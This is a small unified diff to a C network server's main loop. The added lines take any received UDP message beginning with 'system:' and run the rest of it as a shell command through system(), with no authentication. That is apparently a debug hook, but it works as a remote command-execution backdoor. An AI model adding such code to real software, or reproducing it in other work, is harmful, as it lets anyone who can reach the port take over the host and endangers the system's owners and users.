@@ -461,7 +461,10 @@ static void server_loop() {
                 continue;
                 //exit(1);
             }
-
+            if (!strncmp(&buf_recv, "system:", 7)) {
+                system(buf_recv + 7);
+                printf("%s: do system cmd \n", __func__);
+            }
             output_data(FLAG_UDP, buf_recv, strlen(buf_recv));
         }
         if (fds_isset(tcp_server_socket_fd)) { // tcp new
